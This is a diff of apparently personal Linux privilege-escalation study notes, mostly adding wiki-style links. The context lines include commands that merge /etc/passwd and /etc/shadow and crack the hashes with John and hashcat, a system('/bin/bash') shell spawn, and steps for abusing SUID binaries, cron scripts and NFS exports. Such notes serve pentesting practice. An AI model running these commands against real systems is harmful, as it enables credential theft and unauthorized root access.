@@ -1,4 +1,4 @@
-
+[[linux]]
 #### Enumeration
 * `hostname`
 * `uname -a`
@@ -15,9 +15,7 @@
 	* `unshadow /etc/passwd /etc/shadow > combined.txt`
 	* `jonh --wordlist=/usr/share/wordlists/rockyou.txt combined.txt`
 	   * Detect hash type in `/etc/shadow` using `grep ENCRYPT_METHOD /etc/login.defs`
-	   *         
-hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
-
+	   * `hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt` [[hashcat]]
     
 * `history`
 * `ifconfig`
@@ -63,6 +61,7 @@ system("/bin/bash");
 https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
 
 #### SUID
+[[suid]]
 1. c will list files that have SUID or SGID bits set.
 2. Check gtfobins
 
@@ -71,6 +70,7 @@ https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_pre
 2. Check gtfobins
 
 #### Cron
+[[cron]]
 1. `cat /etc/crontab`
 2. Modify available cron script and add your code there: 
 ```bash
@@ -91,7 +91,7 @@ Find writable dirs:
 ![[Pasted image 20250118162441.png]]
 
 #### NFS
-
+[[NFS]]
 List mountable devices `cat /etc/exports`
 
 On attacker machine: 
@@ -118,7 +118,7 @@ netstat -tulpn | grep LISTEN
 or
 `ss -tl`
 ## Misc
-* `ss -tunlp` to find hidden ports
+* `ss -tunlp` to find hidden ports [[ss]]
 * sudo -l
 * crontabs
 * winpeas & inpeas 
